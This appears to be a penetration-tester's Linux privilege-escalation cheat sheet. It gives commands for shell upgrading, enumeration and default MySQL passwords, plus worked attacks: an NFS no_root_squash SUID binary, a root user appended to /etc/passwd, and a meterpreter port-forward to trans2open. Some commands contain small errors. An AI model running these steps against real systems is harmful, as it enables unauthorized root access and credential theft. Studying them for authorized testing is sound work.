g0tmilk's Guide to Linux Privilege Escalation as well:
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

I just got a low-priv shell ! What would S1REN do?
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
OR
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

S1REN would say:
Various Capabilities?
```bash
which gcc
which cc
which python
which perl
which wget
which curl
which fetch
which nc
which ncat
which nc.traditional
which socat
```

Compilation? (Very Back Burner)
```bash
file /bin/bash
uname -a
cat /etc/*-release
cat /etc/issue
```


What Arch?
```bash
file /bin/bash
```

Kernel?
```bash
uname -a
```

Issue/Release?
```bash
cat /etc/issue
cat /etc/*-release
```

Are we a real user?
```bash
sudo -l
ls -lsaht /etc/sudoers
```

Are any users a member of exotic groups?
```bash
groups <user>
```


Check out your shell's environment variables...
```bash
env
```
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

Users?
```bash
cd /home/
ls -lsaht
```

Web Configs containing credentials?
```bash
cd /var/www/html/
ls -lsaht
```

SUID Binaries?
```bash
find / -perm -u=s -type f 2>/dev/null
```

GUID Binaries?
```bash
find / -perm -g=s -type f 2>/dev/null
```

SUID/GUID/SUDO Escalation:
https://gtfobins.github.io/

Binary/Languages with "Effective Permitted" or "Empty Capability" (ep):
https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities
Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.
```bash
getcap -r / 2>/dev/null
```


We need to start monitoring the system if possible while performing our enumeration...
In other words:
"S1REN... Is privilege escalation going to come from some I/O file operations being done by some script on the system?"
https://github.com/DominicBreuker/pspy/blob/master/README.md
```bash
cd /var/tmp/
File Transfer --> pspy32
File Transfer --> pspy64
chmod 755 pspy32 pspy64
./pspy<32/64>
```

What does the local network look like?
```bash
netstat -antup
netstat -tunlp
```

Is anything vulnerable running as root?
```bash
ps aux |grep -i 'root' --color=auto
```

MYSQL Credentials? Root Unauthorized Access?
```bash
mysql -uroot -p
Enter Password:
root : root
root : toor
root :
```

S1REN would take a quick look at etc to see if any user-level people did special things:
```bash
cd /etc/
ls -lsaht
```
Anything other than root here?
• Any config files left behind?
```bash
ls -lsaht |grep -i ‘.conf’ --color=auto
```

• If we have root priv information disclosure - are there any .secret in /etc/ files?
```bash
ls -lsaht |grep -i ‘.secret’ --color=aut
```

SSH Keys I can use perhaps for even further compromise?
```bash
ls -lsaR /home/
```

Quick look in:
```bash
ls -lsaht /var/lib/
ls -lsaht /var/db/
```

Quick look in:
```bash
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
```

File Transfer Capability? What can I use to transfer files?
```bash
which wget
which curl
which nc
which fetch (BSD)
ls -lsaht /bin/ |grep -i 'ftp' --color=auto
```

NFS? Can we exploit weak NFS Permissions?
```bash
cat /etc/exports
```
no_root_squash?
https://recipeforroot.com/attacking-nfs-shares/
```bash
# On attacking machine
mkdir -p /mnt/nfs/
mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
su <user id matching target machine's user-level privilege.>

# On target machine
user@host$ ./suid
#
```

Where can I live on this machine? Where can I read, write and execute files?
```bash
/var/tmp/
/tmp/
/dev/shm/
```

Any exotic file system mounts/extended attributes?
```bash
cat /etc/fstab
```

Forwarding out a weak service for root priv (with meterpreter!):
Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.
https://www.offensive-security.com/metasploit-unleashed/portfwd/
Forwarding out netbios-ssn EXAMPLE:
```bash
meterpreter> portfwd add –l 139 –p 139 –r [target remote host]
meterpreter> background
use exploit/linux/samba/trans2open
set RHOSTS 0.0.0.0
set RPORT 139
run
```

Can we write as a low-privileged user to /etc/passwd?
```bash
openssl passwd -1
i<3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd
su siren
id
```

Cron.
```bash
crontab –u root –l
```

Look for unusual system-wide cron jobs:
```bash
cat /etc/crontab
ls /etc/cron.*
```

Bob is a user on this machine. What is every single file he has ever created?
```bash
find / -user miguel 2>/dev/null
```

Any mail? mbox in User $HOME directory?
```bash
cd /var/mail/
ls -lsaht
```

Linpease:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

Traitor:
https://github.com/liamg/traitor

GTFOBins:
https://gtfobins.github.io/

PSpy32/Pspy64:
https://github.com/DominicBreuker/pspy/blob/master/README.md